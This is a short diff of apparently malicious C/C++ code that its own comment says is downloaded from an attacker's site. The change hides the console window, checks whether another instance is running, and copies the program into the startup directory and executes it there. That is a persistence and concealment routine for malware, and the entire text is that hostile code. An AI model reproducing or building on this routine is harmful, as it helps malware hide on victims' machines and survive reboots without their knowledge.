@@ -30,8 +30,10 @@ int main(int argc, char** argv)
     hideConsole();
 
     /*running once after file is downloaded from the attacker's site*/
-    if (isInStartUp(argv[0])) //check if the application is running from the startUp directory
+    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory and if the process is running
     {
+        if(isRunning())
+            return 1;
         copyToStartUp(argv[0]);
         executeStartUpFile();
         return 0;
